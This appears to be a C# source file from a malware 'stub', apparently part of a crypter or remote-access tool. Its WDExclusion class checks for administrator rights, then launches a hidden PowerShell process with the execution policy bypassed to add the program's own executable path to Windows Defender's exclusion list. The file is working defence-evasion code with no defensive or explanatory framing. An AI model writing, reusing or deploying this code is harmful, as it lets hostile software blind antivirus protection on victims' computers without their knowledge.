using System;
using System.Diagnostics;
using System.Security.Principal;
using System.Windows.Forms;

namespace Stub
{
    internal static class WDExclusion
    {
        public static void AddExclusion()
        {
            if (!IsAdministrator())
            {
                MessageBox.Show("Administrator privileges required to add Defender exclusions.", "Permission Denied", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            try
            {
                string path = Application.ExecutablePath;
                string command = $"Add-MpPreference -ExclusionPath '{path}'";
                RunPowerShell(command);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Failed to add exclusion: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private static void RunPowerShell(string command)
        {
            var psi = new ProcessStartInfo
            {
                FileName = "powershell",
                Arguments = $"-ExecutionPolicy Bypass -WindowStyle Hidden -Command \"{command}\"",
                CreateNoWindow = true,
                UseShellExecute = false,
            };
            Process.Start(psi);
        }

        private static bool IsAdministrator()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }
    }
}
